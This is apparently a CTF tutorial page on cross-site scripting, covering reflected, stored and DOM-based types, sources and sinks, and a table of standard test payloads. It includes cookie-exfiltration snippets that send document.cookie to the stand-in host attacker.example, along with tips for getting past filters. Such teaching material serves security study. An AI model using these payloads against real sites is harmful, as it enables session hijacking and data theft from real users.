---
title: "Cross-Site Scripting (XSS)"
description: "Exploit reflected, stored, or DOM-based XSS vulnerabilities to execute JavaScript in the victim’s browser during CTF challenges."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["xss", "cross-site scripting", "web", "ctf"]
authors: ["CTF.Support Team"]
summary: "Learn XSS techniques to inject JavaScript payloads through input fields, parameters, or stored content to exfiltrate data or trigger flags."
aliases: ["/web/xss/"]
slug: "xss"
toc: true
---

## Introduction

**Cross-Site Scripting (XSS)** vulnerabilities allow attackers to inject JavaScript into a webpage viewed by other users.  
They commonly appear in parameters, forms, or stored data without proper output sanitization.

---

## Types

| Type          | Description                                                                      |
|---------------|----------------------------------------------------------------------------------|
| **Reflected** | Payload included in the request and immediately reflected back to the user.      |
| **Stored**    | Payload stored permanently on the server (e.g., in a database).                  |
| **DOM-Based** | Payload executed in the browser without server interaction by modifying the DOM. |

---

## Sources and Sinks

- **Sources** - Where user data *enters the page logic*, such as: `location.hash`, `document.URL`, `document.referrer`
- **Sinks** - Where that data *is written to the page*, like: `document.write()`, `innerHTML`, `eval()`, `setTimeout()`, `Element.innerText`

**Rule of thumb:** Danger arises when untrusted data enters a Source to a Sink without sanitization.

---

## Quick Reference

| Context         | Example                                             | Notes                       |
|-----------------|-----------------------------------------------------|-----------------------------|
| **HTML**        | `<script>alert(1)</script>`                         | Standard test               |
| **Attribute**   | `<img src=x onerror=alert(1)>`                      | Event handler               |
| **URL**         | `javascript:alert(1)`                               | Clickable JavaScript scheme |
| **CSS / Style** | `<div style="background:url(javascript:alert(1))">` | Rare but possible           |
| **SVG**         | `<svg/onload=alert(1)>`                             | Common filter bypass        |

---

## Common Payloads

### Basic Proofs of Concept

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<a href="javascript:alert(document.cookie)">Click Me</a>
```

### Cookie or Data Exfiltration (CTF Exercises)

**Redirect and log cookie:**

```javascript
document.location = "https://attacker.example/?c=" + document.cookie
```

**Stealth exfiltration via image request:**

```javascript
document.write('<img src="https://attacker.example/collect.gif?cookie=' + document.cookie + '">')
```

or

```html
<img src=x onerror=this.src='https://attacker.example/?c='+document.cookie>
```

---

## DOM-Based Example

```js
var search = location.hash.substring(1); // Source
document.getElementById("output").innerHTML = search; // Sink
```

Visiting `https://target/#<img src=x onerror=alert(1)>` executes the script entirely client‑side.

---

## Tips

- Use the browser’s developer console to observe reflected parameters.  
- Encode payloads for bypass: `&lt;script&gt;alert(1)&lt;/script&gt;`  
- Bypass filters with alternate encodings or event handlers (`onfocus`, `onmouseover`).  
